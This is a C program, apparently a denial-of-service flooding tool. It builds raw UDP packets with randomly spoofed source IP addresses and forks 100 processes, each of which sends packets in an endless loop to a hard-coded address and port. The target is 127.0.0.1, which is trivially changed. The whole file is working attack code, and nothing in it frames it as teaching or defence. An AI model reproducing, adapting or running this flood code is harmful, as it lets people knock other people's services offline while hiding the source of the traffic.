#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define THREADS 100

void sendDDoS() {
    char datagram[4096], source_ip[32];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct udphdr *udph = (struct udphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) {
        perror("socket");
        exit(1);
    }
    sin.sin_family = AF_INET;
    sin.sin_port = htons(1337);
    inet_pton(AF_INET, "127.0.0.1", &(sin.sin_addr));
    memset(datagram, 0, 4096);
    sprintf(source_ip, "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;
    udph->source = htons(5678);
    udph->dest = htons(1337);
    udph->len = htons(sizeof(struct udphdr));
    udph->check = 0;
    while (1) {
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            perror("sendto");
            exit(1);
        }
        usleep(10000);
    }
}

int main() {
    int i;
    for (i = 0; i < THREADS; i++) {
        if (fork() == 0) {
            sendDDoS();
            exit(0);
        }
    }
    return 0;
}
